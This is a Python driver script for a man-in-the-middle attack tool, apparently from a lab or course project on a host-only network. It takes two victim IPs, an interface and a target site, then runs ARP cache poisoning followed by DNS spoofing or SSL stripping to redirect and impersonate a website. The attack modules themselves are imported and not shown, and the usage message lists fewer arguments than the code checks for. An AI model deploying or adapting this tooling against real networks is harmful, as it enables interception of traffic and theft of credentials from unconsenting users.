import time
import sys

from arppoisoning import ArpPoisoning
from getmacipattacker import GetIpMac
from dnsspoofing import DnsSpoofing
#from dnspoisoning import DnsPoisoning
from sslstripping import SimpleSslStrip

#victim1
#macWindows = "08:00:27:b7:c4:af"
global ip_victim_1 #= "192.168.56.3"

#victim2
#macServer = "08:00:27:cc:08:6f"
global ip_victim_2 # =  "192.168.56.103"

global interface #= "enp0s8"

global mac_attacker
global ip_attacker
global type_of_attack
global redirect_website

if len(sys.argv) != 7:
    print("Invalid number of arguments. Usage: python3 main.py ip_victim_1 ip_victim_2 interface type_of_attack "
          "redirect_website")
else:
    ip_victim_1 = sys.argv[1]
    ip_victim_2 = sys.argv[2]
    interface = sys.argv[3]
    type_of_attack = sys.argv[4]
    redirect_website = sys.argv[5]
    site_to_impersonate = sys.argv[6]


if __name__ == "__main__":
    get_ip_mac_module = GetIpMac(interface)
    mac_ip_attacker = get_ip_mac_module.get_mac_ip()
    mac_attacker = mac_ip_attacker[0]
    ip_attacker = mac_ip_attacker[1]

    arp_poisoning_module = ArpPoisoning(ip_victim_1, ip_victim_2, mac_attacker, ip_attacker, interface)
    arp_poisoning_module.execute_poisoning()

    if(type_of_attack == "dns"):
        print("DNSNS")
        dns_spoof_module = DnsSpoofing(redirect_website, site_to_impersonate)
        dns_spoof_module.execute_poisoning()
    else:
        ssl_strip_module = SimpleSslStrip(redirect_website, site_to_impersonate)
        ssl_strip_module.execute_stripping()



